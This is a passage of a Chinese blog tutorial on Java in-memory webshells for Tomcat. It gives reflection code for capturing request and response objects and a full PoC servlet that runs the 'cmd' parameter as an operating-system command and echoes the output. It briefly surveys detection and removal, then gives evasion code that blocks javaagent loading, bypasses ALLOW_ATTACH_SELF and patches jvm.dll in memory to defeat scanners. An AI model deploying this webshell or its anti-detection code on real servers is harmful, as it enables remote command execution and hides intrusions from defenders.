，但是我们后续可以通过反射修改。\n可以总结思路如下\n\n反射修改 ApplicationDispatcher.WRAP_SAME_OBJECT 的值，通过 ThreadLocal#set 方法将request和response对象存储到变量中\n初始化 lastServicedRequest 和 lastServicedResponse 两个变量，默认为null\n通过 ThreadLocal#get 方法将 request 和 response 对象从 lastServicedRequest 和 lastServicedResponse 中取出\n\n反射存储request和responsejava//反射获取所需属性Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;); //使用modifiersField反射修改final型变量java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);modifiersField.setAccessible(true);modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);WRAP_SAME_OBJECT_FIELD.setAccessible(true);lastServicedRequestField.setAccessible(true);lastServicedResponseField.setAccessible(true); //将变量WRAP_SAME_OBJECT_FIELD设置为trueif (!WRAP_SAME_OBJECT_FIELD.getBoolean(null))&#123;    WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);&#125;\n\n初始化变量由于变量在Tomcat初始化运行的时候会被设置为null，因此我们还需要初始化lastServicedRequest和lastServicedResponse变量为ThreadLocal类\njavaif (lastServicedRequestField.get(null)==null)&#123;    lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());&#125; if (lastServicedResponseField.get(null)==null)&#123;    lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());&#125;\n\n获取request变量javaif(lastServicedRequestField.get(null)!=null)&#123;    ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);    ServletRequest servletRequest = (ServletRequest) threadLocal.get();    System.out.println(servletRequest);    System.out.println((HttpServletRequest) servletRequest == req);&#125;\n\n下面我们通过一个简单的demo看看效果，编写一个简单的Servlet\njavaimport org.apache.catalina.core.ApplicationFilterChain; import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Modifier; @WebServlet(&quot;/echo&quot;)public class Tomcat_Echo extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;         try &#123;             //反射获取所需属性            Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;);             //使用modifiersField反射修改final型变量            java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);            modifiersField.setAccessible(true);            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);            WRAP_SAME_OBJECT_FIELD.setAccessible(true);            lastServicedRequestField.setAccessible(true);            lastServicedResponseField.setAccessible(true);             //将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null))&#123;                WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);            &#125;             if (lastServicedRequestField.get(null)==null)&#123;                lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());            &#125;             if (lastServicedResponseField.get(null)==null)&#123;                lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());            &#125;             //获取request变量            if(lastServicedRequestField.get(null)!=null)&#123;                ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);                ServletRequest servletRequest = (ServletRequest) threadLocal.get();                System.out.println(servletRequest);                System.out.println((HttpServletRequest) servletRequest == req);            &#125;            //获取response变量            if(lastServicedResponseField.get(null)!=null)&#123;                ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(null);                ServletResponse servletResponse = (ServletResponse) threadLocal.get();                System.out.println(servletResponse);                System.out.println((HttpServletResponse) servletResponse == resp);            &#125;         &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125; catch (IllegalAccessException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n局限性如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat Response进行回显。如Shiro RememberMe反序列化漏洞，因为Shiro的RememberMe功能实际上就是一个自定义的Filter。我们知道在ApplicationFilterChain#internalDoFilter方法中，doFilter方法实际上是在我们获取response之前的。因此在Shiro漏洞环境下我们无法通过这种方式获得回显。\njavaprivate void internalDoFilter(ServletRequest request,                                  ServletResponse response)        throws IOException, ServletException &#123;         // Call the next filter if there is one        if (pos &lt; n) &#123;            ApplicationFilterConfig filterConfig = filters[pos++];            try &#123;...                &#125; else &#123;                     //Shiro漏洞触发点                    filter.doFilter(request, response, this);                &#125;...         // We fell off the end of the chain -- call the servlet instance        try &#123;             //response回显触发点            if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;                lastServicedRequest.set(request);                lastServicedResponse.set(response);            &#125;...            &#125; else &#123;                servlet.service(request, response);            &#125;        &#125;...    &#125;\n\n通过全局存储Response回显思路来自于 Litch1师傅\nServlet容器是Java Web的核心，因此很多框架对于该容器都进行了一定程度的封装。不同框架、同一框架的不同版本的实现都有可能不同，因此我们很难找到一种通用的获取回显的方法。\n比如我们上文通过ThreadLocal类来获取回显的方式就无法适用于Shiro框架下，那么我们能不能换一种思路，寻找Tomcat中全局存储的Request和Response呢？\n但我们知道想要获取回显，request和response对象必须是属于当前线程的，因此通过全局存储获取回显的关键就在于找到当前代码运行的上下文和Tomcat运行上下文的联系。\n寻找全局Response首先我们先来寻找一下Tomcat中的一些全局Response。在 AbstractProcessor 类中，我们能够找到全局response。\n\n调用栈分析我们来分析一下Tomcat的调用栈\njavadoGet:25, Tomcat_Echoservice:655, HttpServlet (javax.servlet.http)service:764, HttpServlet (javax.servlet.http)internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)...service:357, CoyoteAdapter (org.apache.catalina.connector)service:382, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1722, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:745, Thread (java.lang)\n\n调用了 Http11Processor#service 方法\n而 Http11Processor 继承了 AbstractProcessor 类，这里的response对象正是 AbstractProcessor 类中的属性，因此我们如果能获取到 Http11Processor 类，就能获取到response对象\n\n那么下面我们就找一找那里能够获取到processor。在 AbstractProtocol 的内部类 ConnectionHandler#register 方法中，将processor的信息存储在了属性global中。\njavaprotected void register(Processor processor) &#123;            if (this.getProtocol().getDomain() != null) &#123;                synchronized(this) &#123;                    try &#123;...                        RequestInfo rp = processor.getRequest().getRequestProcessor();                        rp.setGlobalProcessor(this.global);                       ...&#125;\n\n\n该属性中存储了一个RequestInfo的List，其中在RequestInfo中我们也能获取Request\n\n\n我们接着往下看，调用栈调用了内部类ConnectoinHandler的process()方法，该方法会调用registry方法将process存储在global中\n\n至此我们的调用链如下:\nAbstractProtocol$ConnectoinHandler#process()    --&gt;this.global        --&gt;RequestInfo            --&gt;Request                --&gt;Response\n\n现在我们的工作就是获取AbstractProtocol类或者继承AbstractProtocol的类，继续看调用链。在CoyoteAdapter类中，存在一个connector属性\n\n我们来看Connector类的定义，存在和AbstractProtocol相关的protocolHandler属性\n\n此时我们看调用链，该属性的值为一个 Http11NioProtocol 对象，并且该类继承了AbstractProtocol类\n\n\n此时我们的调用链变成如下:\nConnector    --&gt;Http11NioProtocol        --&gt;AbstractProtocol$ConnectoinHandler#process()            --&gt;this.global                --&gt;RequestInfo                    --&gt;Request                        --&gt;Response\n\n下面就是获取Connector了，Tomcat在启动时会通过StandardService创建Connector\n\nStandardService#addConnector 如下，该方法会将Connector放入属性 connectors 中\njavapublic void addConnector(Connector connector) &#123;         synchronized (connectorsLock) &#123;            connector.setService(this);            Connector results[] = new Connector[connectors.length + 1];            System.arraycopy(connectors, 0, results, 0, connectors.length);            results[connectors.length] = connector;            connectors = results;        &#125;         try &#123;            if (getState().isAvailable()) &#123;                connector.start();            &#125;        &#125; catch (LifecycleException e) &#123;            throw new IllegalArgumentException(                    sm.getString(&quot;standardService.connector.startFailed&quot;, connector), e);        &#125;         // Report this property change to interested listeners        support.firePropertyChange(&quot;connector&quot;, null, connector);    &#125;\n\n\n最终我们的调用链如下:\nStandardService    --&gt;Connector        --&gt;Http11NioProtocol            --&gt;AbstractProtocol$ConnectoinHandler#process()                --&gt;this.globa                    --&gt;RequestInfo                        --&gt;Request                            --&gt;Response\n\n下面的工作就是获取StandardService对象了，在此之前我们先了解一下Tomcat的类加载机制。\nTomcat的类加载机制众所周知，Tomcat使用的并不是传统的类加载机制，我们来看下面的例子\n我们知道，Tomcat中的一个个Webapp就是一个个Web应用，如果WebAPP A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2。这样在加载的时候由于全限定名相同，因此不能同时加载，所以必须对各个Webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离。\nTomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是 WebappClassLoader 。\n那么我们又如何将原有的父加载器和 WebappClassLoader 联系起来呢？这里Tomcat使用的机制是线程上下文类加载器Thread ContextClassLoader。\nThread类中有 getContextClassLoader() 和 setContextClassLoader(ClassLoader cl) 方法用来获取和设置上下文类加载器。如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。对于Tomcat来说ContextClassLoader被设置为 WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。\n因此WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。\n这里通过调试，我们能够看到这里的线程类加载器是继承了 WebAppClassLoader 的 ParallelWebAppClassLoader 。\n\n其中我们同样能获取到 StandardService\n\n构造Payload按照上文对调用栈分析的思路，我们可以依次构造出如下Payload\n获取StandardContext\norg.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();\n\n获取ApplicationContext\nStandardContext中没有直接的方法获取context，因此我们需要通过反射获取\n\nField context = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;context&quot;);context.setAccessible(true);org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)context.get(standardContext);\n\n获取StandardService\n同样使用反射获取\n//获取StandardServiceField standardServiceField = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;).getDeclaredField(&quot;service&quot;);standardServiceField.setAccessible(true);StandardService standardService = (StandardService) standardServiceField.get(applicationContext);\n\n获取Connector\n//获取ConnectorField connectorsField = Class.forName(&quot;org.apache.catalina.connector.Connector&quot;).getDeclaredField(&quot;connectors&quot;);connectorsField.setAccessible(true);Connector[] connectors = (Connector[]) connectorsField.get(standardService);Connector connector = connectors[0];\n\n获取Handler\n我们可以通过 Connector#getProtocolHandler 方法来获取对应的 protocolHandler\n\n这里获取的 protocolHandler 是 Http11NioProtocol 对象，前面我们分析过了该类继承了 AbstractProtocol 类，下面我们再通过反射获取Handler——内部类 ConnectionHandler\n//获取HandlerProtocolHandler protocolHandler = connector.getProtocolHandler();Field handlerField = Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;).getDeclaredField(&quot;handler&quot;);handlerField.setAccessible(true);org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);\n\n\n获取内部类ConnectionHandler的global属性\n//获取内部类AbstractProtocol$ConnectionHandler的global属性Field globalHandler = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredField(&quot;global&quot;);globalHandler.setAccessible(true);RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler);\n\n获取processor\nglobal属性RequestGroupInfo类中的processors数组用来存储RequestInfo对象，下面我们来获取RequestInfo对象，进而获取request对象\n\n//获取processorsField processorsField = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;);processorsField.setAccessible(true);List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);\n\n最后我们获取request和response对象\n获取request和response\n这里我选择进一步获取org.apache.catalina.connector.Request对象，因为它继承自HttpServletRequest，我们可以通过PrintWrinter类直接获取回显\n\njava//获取request和responseField requestField = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;);requestField.setAccessible(true);for (RequestInfo requestInfo : requestInfoList)&#123;     //获取org.apache.coyote.Request    org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);     //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request    org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);    org.apache.catalina.connector.Response http_response = http_request.getResponse();     PrintWriter writer = http_response.getWriter();    String cmd = http_request.getParameter(&quot;cmd&quot;);     InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();    Scanner scanner = new Scanner(inputStream).useDelimiter(&quot;\\\\A&quot;);    String result = scanner.hasNext()?scanner.next():&quot;&quot;;    scanner.close();    writer.write(result);    writer.flush();    writer.close();&#125;\n\n完整POCjavaimport org.apache.catalina.connector.Connector;import org.apache.catalina.core.ApplicationContext;import org.apache.catalina.core.StandardContext;import org.apache.catalina.core.StandardService;import org.apache.coyote.ProtocolHandler;import org.apache.coyote.RequestGroupInfo;import org.apache.coyote.RequestInfo;import org.apache.tomcat.util.net.AbstractEndpoint; import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.InputStream;import java.io.PrintWriter;import java.lang.reflect.Field;import java.util.List;import java.util.Scanner; @WebServlet(&quot;/response&quot;)public class Tomcat_Echo_Response extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;         //获取StandardService        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();         System.out.println(standardContext);         try &#123;            //获取ApplicationContext            Field applicationContextField = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;context&quot;);            applicationContextField.setAccessible(true);            ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(standardContext);             //获取StandardService            Field standardServiceField = Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredField(&quot;service&quot;);            standardServiceField.setAccessible(true);            StandardService standardService = (StandardService) standardServiceField.get(applicationContext);             //获取Connector            Field connectorsField = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;).getDeclaredField(&quot;connectors&quot;);            connectorsField.setAccessible(true);            Connector[] connectors = (Connector[]) connectorsField.get(standardService);            Connector connector = connectors[0];             //获取Handler            ProtocolHandler protocolHandler = connector.getProtocolHandler();            Field handlerField = Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;).getDeclaredField(&quot;handler&quot;);            handlerField.setAccessible(true);            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);             //获取内部类AbstractProtocol$ConnectionHandler的global属性            Field globalHandler = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredField(&quot;global&quot;);            globalHandler.setAccessible(true);            RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler);             //获取processors            Field processorsField = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;);            processorsField.setAccessible(true);            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);             //获取request和response            Field requestField = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;);            requestField.setAccessible(true);            for (RequestInfo requestInfo : requestInfoList)&#123;                 //获取org.apache.coyote.Request                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);                 //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);                org.apache.catalina.connector.Response http_response = http_request.getResponse();                 PrintWriter writer = http_response.getWriter();                String cmd = http_request.getParameter(&quot;cmd&quot;);                 InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();                Scanner scanner = new Scanner(inputStream).useDelimiter(&quot;\\\\A&quot;);                String result = scanner.hasNext()?scanner.next():&quot;&quot;;                scanner.close();                writer.write(result);                writer.flush();                writer.close();            &#125;          &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125; catch (IllegalAccessException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n\n查杀内存马师傅的猜想：\n\nc0ny1 师傅将 filterMaps 中的所有 filterMap 遍历出来，然后提供了 dumpclass，显然，如果获得目标类的 class 反编译代码，加入人为判断的模式，就可以知道 filter 代码中是否有恶意操作了。深蓝师傅魔改版本\n\nc0ny1 和 jweny 师傅内存马最大的特点就是储存在内存，无文件落地，那也就代表了这个类对应的 ClassLoader 目录下没有对应的 class 文件\n\n利用 VisualVM 来监控 Mbeans 来检测内存马的思路，原理是在注册类似 Filter 的时候会触发 registerJMX 的操作来注册 mbean\n\n宽字节安全扫字节码的方式。\n\n\n业界主要使用的两种检测方法：\n\n基于反射的检测方法该方法是一种轻量级的检测方法，不需要注入Java进程，主要用于检测非Agent型的内存马，由于非Agent型的内存马会在Java层新增多个类和对象，并且会修改一些已有的数组，因此通过反射的方法即可检测，但是这种方法无法检测Agent型内存马。\n\n基于instrument机制的检测方法该方法是一种通用的重量级检测方法，需要将检测逻辑通过attach API注入Java进程，理论上可以检测出所有类型的内存马。当然instrument不仅能用于内存马检测，java.lang.instrument是Java 1.5引入的一种可以通过修改字节码对Java程序进行监测的一种机制，这种机制广泛应用于各种Java性能检测框架、程序调试框架，如JProfiler、IntelliJ IDE等，当然近几年比较流行的RASP也是基于此类技术。\n\n\n手工可以看看配置文件之类的\n如何杀掉内存马对于非Agent马两种思路：\n\n从系统中移除该对象。（推荐）\n访问时抛异常（或跳过调用），中断此次调用。\n\n对于Agent马：retransform。\n如何防止Java Agent内存马被杀阻止后续 javaagent 加载\n注入 class 到当前线程中，然后实例化注入内存马\n\n通过执行 Java 代码来卸载掉这个 mbean 来隐藏自己\n\nthreedr3am 师傅提出了，阻止后续 javaagent 加载的方式，防止webshell 被查杀。Github项目\n\n\n关键代码\njavatry &#123;    vmObj = VirtualMachine.attach(args[0]);    String agentpath = ZhouYu.class.getProtectionDomain().getCodeSource().getLocation().getFile();    if (vmObj != null) &#123;        if (args.length &gt; 1) &#123;            vmObj.loadAgent(agentpath, args[1]);        &#125; else &#123;            vmObj.loadAgent(agentpath);        &#125;    &#125;&#125; finally &#123;    if (null != vmObj) &#123;        vmObj.detach();    &#125;&#125;\n\nallowAttachSelf绕过该思路来源于：rebeyond师傅\n只是总结一下之前师傅文章中的方法，所以无分析过程。\ninstrument通过attach方法提供了在JVM运行时动态查看、修改Java类的功能，比如通过instrument动态注入内存马。但是在Java9及以后的版本中，默认不允许。\n但是attach的时候会创建一个HotSpotVirtualMachine的父类，这个类在初始化的时候会去获取VM的启动参数，并把这个参数保存至HotSpotVirtualMachine的ALLOW_ATTACH_SELF属性中，恰好这个属性是个静态属性，所以我们可以通过反射动态修改这个属性的值。构造如下POC：\nClass cls=Class.forName(&quot;sun.tools.attach.HotSpotVirtualMachine&quot;);Field field=cls.getDeclaredField(&quot;ALLOW_ATTACH_SELF&quot;);field.setAccessible(true);Field modifiersField=Field.class.getDeclaredField(&quot;modifiers&quot;);modifiersField.setInt(field,field.getModifiers()&amp;~Modifier.FINAL);field.setBoolean(null,true);\n\nWindos下破坏attach用JNI防检测因为堆栈平衡原因，要考虑32位和64位，否则会使程序崩溃。\ncunsigned char buf[]=&quot;\\xc2\\x14\\x00&quot;; //32,direct return enqueue functionHINSTANCE hModule = LoadLibrary(L&quot;jvm.dll&quot;);//LPVOID dst=GetProcAddress(hModule,&quot;ConnectNamedPipe&quot;);LPVOID dst=GetProcAddress(hModule,&quot;_JVM_EnqueueOperation@20&quot;);DWORD old;if (VirtualProtectEx(GetCurrentProcess(),dst, 3, PAGE_EXECUTE_READWRITE, &amp;old))&#123;WriteProcessMemory(GetCurrentProcess(), dst, buf, 3, NULL);VirtualProtectEx(GetCurrentProcess(), dst, 3, old, &amp;old);&#125;/*unsigned char buf[]=&quot;\\xc3&quot;; //64,direct return enqueue functionHINSTANCE hModule = LoadLibrary(L&quot;jvm.dll&quot;);//LPVOID dst=GetProcAddress(hModule,&quot;ConnectNamedPipe&quot;);LPVOID dst=GetProcAddress(hModule,&quot;JVM_EnqueueOperation&quot;);//printf(&quot;ConnectNamedPipe:%p&quot;,dst);DWORD old;if (VirtualProtectEx(GetCurrentProcess(),dst, 1, PAGE_EXECUTE_READWRITE, &amp;old))&#123;WriteProcessMemory(GetCurrentProcess(), dst, buf, 1, NULL);VirtualProtectEx(GetCurrentProcess(), dst, 1, old, &amp;old);&#125;*/\n\nLinux下破坏attach把对应的UNIX Domain Socket文件删掉\n结语关于内存马的攻防，还一直在不停迭代当中，就目前而言，还并没有行之有效的对内存马查杀方法，因为当前的查杀方法都有其弊端。\n内存马可以配合JNDI注入，反序列化，普通马改为内存马等方法写入。目前红队内网站稳脚跟的首选。\n无文件落地攻击，内存马也不是JAVA的专属甚至不是WEB的专属，如 .NET 与 ThinkPHP 中也有，但原理大致一样，Windows中就有很大区别，但这里主要介绍的JavaWeb下，就不在过多介绍\n","categories":["WEB"],"tags":["java","webshell"]}]